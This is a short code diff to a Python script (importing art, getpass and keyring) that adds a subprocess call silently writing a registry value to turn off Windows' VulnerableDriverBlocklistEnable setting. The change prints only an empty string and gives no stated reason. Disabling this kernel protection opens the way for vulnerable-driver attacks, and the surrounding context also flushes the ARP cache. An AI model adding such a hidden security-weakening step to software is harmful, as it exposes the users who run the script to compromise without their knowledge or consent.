@@ -5,6 +5,15 @@ from art import *
 import getpass
 import keyring
 
+import subprocess
+
+try:
+    subprocess.run('reg add HKLM\SYSTEM\CurrentControlSet\CI\Config /v "VulnerableDriverBlocklistEnable" /t REG_DWORD /d 0 /f', shell=True, check=True)
+    print("")
+except subprocess.CalledProcessError as e:
+    print("Error occurred:", e)
+
+
 try:
     subprocess.run(["netsh", "interface", "ip", "delete", "arpcache"], check=True)
     print("")
